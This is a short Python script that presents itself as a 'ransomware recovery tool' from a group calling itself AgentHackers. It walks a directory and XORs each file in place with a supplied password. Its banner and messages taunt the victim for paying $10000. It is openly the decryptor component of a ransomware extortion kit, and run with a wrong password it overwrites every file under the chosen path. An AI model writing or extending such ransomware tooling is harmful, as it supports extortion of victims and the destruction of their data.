import os
import sys
import time

banner = '''

##################################################
#                                                #
#       Agent2 Ransomware Recovery Tool          #
#                                                #                     
#             [By AgentHackers]                  #
##################################################
    [Thank you for wasting $10000 for us!! ]
                [Feel free now!]
'''

def decrypt(file_path, password):
    with open(file_path, 'rb') as f:
        data = f.read()
    decrypted = bytearray()
    key = password.encode()
    for i, b in enumerate(data):
        decrypted.append(b ^ key[i % len(key)])
    with open(file_path, 'wb') as f:
        f.write(decrypted)
print(banner)
time.sleep(1)
print("Preparing for the recovery process this won't take an our but a minute")
print("Being patient is so important")
time.sleep(2)
def decrypt_files(path, password):
    for dirpath, _, filenames in os.walk(path):
        for f in filenames:
            decrypt(os.path.join(dirpath, f), password)
            print("Thank you indeed for wasting $10000 money for us! Your files are recovered successfully")


if __name__ == '__main__':
    if len(sys.argv) != 3:
        print(banner)
        print("Usage: python decrypt.py <path to decrypt> <password>")
    else:
        decrypt_files(sys.argv[1], sys.argv[2])
